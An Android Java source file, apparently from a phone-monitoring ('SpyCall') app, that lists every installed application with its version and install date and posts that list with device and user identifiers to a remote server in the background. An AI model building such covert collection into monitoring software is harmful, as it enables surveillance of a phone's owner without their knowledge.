/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.  3:30:19 PM  Jul 12, 2013
 */
package com.hinj.asynctask;

import java.io.File;
import java.sql.Date;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.InstalledApp;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

public class InstalledAppAsynctask extends AsyncTask<String, Void, String> {
	
	private static final String TAG = "InstalledAppAsynctask";
	private Context ctx;
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;
	private InstalledApp[] latestInstalledApp;
	/**
	 * 
	 */
	public InstalledAppAsynctask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected final String doInBackground(String... params) {
		
		try{
			getAllInstalledApp();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedInstalledApp();
		}
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}
	
	/*********************** Start Installed App *********************/

	public final  void  getAllInstalledApp() {

		final List<PackageInfo> packs = ctx.getPackageManager().getInstalledPackages(0);
		latestInstalledApp = new InstalledApp[packs.size()];
		
		final int totalInstallAppCount=packs.size();
		final int preInstallAppCount = SpyCallSharedPrefrence.getsaveINSTALL_APP_PreCount(ctx);
		final int remaningInstallAppCount = totalInstallAppCount - preInstallAppCount;
		
		if(remaningInstallAppCount>0){
			
			String tempInstalled = "";
			String installedAppDetail=null;
			/*for (int i = 0; i < remaningInstallAppCount; i++) {
	
				String packageName = packs.get(i).packageName;
				String applicationname = packs.get(i).applicationInfo.loadLabel(
						ctx.getPackageManager()).toString();
				String version = packs.get(i).versionName;
	
				String installedDate = new Date(packs.get(i).firstInstallTime)
						.toString();
				
				tempInstalled = Uri.encode(applicationname) + "|||"
						+ Uri.encode(packageName) + "|||" + version + "|||"
						+ Uri.encode(installedDate);
				
				if (installedAppDetail != null) {
					installedAppDetail = tempInstalled + "##KM##" + installedAppDetail;
				} else {
					installedAppDetail = tempInstalled;
				}
			}*/
			
			for (int i = 0; i < packs.size(); i++) {

				final String packageName = packs.get(i).packageName;
				final String applicationname = packs.get(i).applicationInfo.loadLabel( ctx.getPackageManager()).toString();
				final String version = packs.get(i).versionName;

				final long installedDate = getallapptime(packageName);
				latestInstalledApp[i]=new InstalledApp(Uri.encode(applicationname),Uri.encode(packageName),version,installedDate);

			}
			maindata();

			for (int i = preInstallAppCount; i < latestInstalledApp.length; i++) {
				//Log.i(TAG, latestInstalledApp[i].getApplicationName());
				tempInstalled = latestInstalledApp[i].getApplicationName() + "|||"
						+ Uri.encode(latestInstalledApp[i].getApplicationPackage()) + "|||" + latestInstalledApp[i].getVersion() + "|||"
						+ Uri.encode(new Date(latestInstalledApp[i].getInstalledDate())	.toString());
							
				if (installedAppDetail != null) {
					installedAppDetail = tempInstalled + "##KM##" + installedAppDetail;
				} else {
					installedAppDetail = tempInstalled;
				}
			}
			
			//return installedAppDetail;
			final int totalCount=preInstallAppCount+remaningInstallAppCount;
			try {
	
				if (Utility.isNetworkAvailable(ctx)) {
					new InstalledAppPostAsyncTask()
							.execute(installedAppDetail,totalCount+"");
				}
				
			} catch (Exception e) {
				//getCalendarEvents();
				e.printStackTrace();
			}
		
		}else{
			Log.i(TAG, "No Install App log");
			//getCalendarEvents();
		}
	}
	
	
	public final long getallapptime(String packageName){
		final PackageManager pm = ctx.getPackageManager();
		ApplicationInfo appInfo = null;
		try {
			appInfo = pm.getApplicationInfo(packageName, 0);
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		final String appFile = appInfo.sourceDir;

		final long installed = new File(appFile).lastModified();
		return installed;
	}

	@SuppressWarnings({ "unchecked", "rawtypes" })
	public final void maindata() {
		Arrays.sort( latestInstalledApp, new Comparator()
		{
			public int compare(Object o1, Object o2) {
				return new Long(((InstalledApp)o1).getInstalledDate()).compareTo(new Long(((InstalledApp) o2).getInstalledDate()));
			}

		});
	}
	
	/**
	 * posting installed app values on server
	 * @author rajeevc
	 *
	 */
	
	class InstalledAppPostAsyncTask extends AsyncTask<String, Void, Void> {

		
		/**
		 * 
		 */
		public InstalledAppPostAsyncTask() {
		}
		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params) {
			// make your request here - it will run in a different thread
			try {
				final String getDeviceIDString = SpyCallSharedPrefrence.getsaveDEVICEID_Pre(ctx);
				//Log.i(TAG, params[0]);
				mRequestPostClass = new RequestPost();
				String getUserID_SP = HinjAppPreferenceUtils.getRaId(ctx);
				String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
				//String deviceID = HinjAppPreferenceUtils.getDeviceId(ctx);
				String upload_device_id = HinjAppPreferenceUtils.getUploadDeviceID(ctx);
				final String getResponceBrowser = mRequestPostClass.postInstalledApplicaiton(params[0], getDeviceIDString,getUserID_SP,android_id);
				 Log.e(TAG, getResponceBrowser);

				final JSONObject responseObject = new JSONObject(getResponceBrowser).getJSONObject("response");
				if ("success".equals(responseObject.getString("success"))) {
					Log.i(TAG, "Success");
					Log.i("saveINSTALL_APP_PreCount", ""+Integer.parseInt(params[1]));

					SpyCallSharedPrefrence.saveINSTALL_APP_PreCount(ctx, Integer.parseInt(params[1]));
				
				}
			} catch (JSONException e) {
				e.printStackTrace();
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			//getCalendarEvents();
		}
	}
	
	
	/*********************** End Installed App ***********************/
}
